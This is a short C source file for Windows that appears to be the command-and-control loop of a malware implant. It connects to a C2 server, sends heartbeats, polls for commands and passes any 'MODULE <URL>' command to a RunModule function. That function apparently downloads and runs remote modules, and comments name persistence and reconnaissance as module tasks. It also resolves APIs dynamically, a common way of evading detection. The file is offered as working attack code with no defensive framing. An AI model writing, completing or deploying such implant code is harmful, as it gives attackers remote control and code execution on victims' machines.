#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "c2_communication_fixed.h"
#include "payload.h"

// Function pointer types for resolved APIs
typedef void (WINAPI* pSleep)(DWORD);

DWORD WINAPI RunC2Loop(LPVOID lpParam) {
    // Resolve APIs
    pSleep Sleep = (pSleep)resolve_api("kernel32.dll", "Sleep");

    if (!C2_Connect()) {
        // Connection failed, exit thread
        return 1;
    }

    C2_SendHeartbeat();

    char commandBuffer[512]; // Increased buffer size for URLs
    while (TRUE) {
        if (C2_ReceiveCommand(commandBuffer, sizeof(commandBuffer))) {
            // Command received, process it
            if (strcmp(commandBuffer, "EXIT") == 0) {
                break;
            }
            // --- THIS IS THE CORRECTED LOGIC ---
            // The agent only understands one command: "MODULE <URL>"
            // All actions (persistence, recon, etc.) are handled by modules.
            else if (strncmp(commandBuffer, "MODULE", 6) == 0) {
                // The command is "MODULE <URL>", so we pass the URL part to RunModule
                printf("[*] Received module command. URL: %s\n", commandBuffer + 7);
                RunModule(commandBuffer + 7); // Skip "MODULE "
            }
        }

        if (Sleep) {
            Sleep(5000); // Wait for 5 seconds before checking for next command
        }
    }

    C2_Disconnect();
    return 0;
}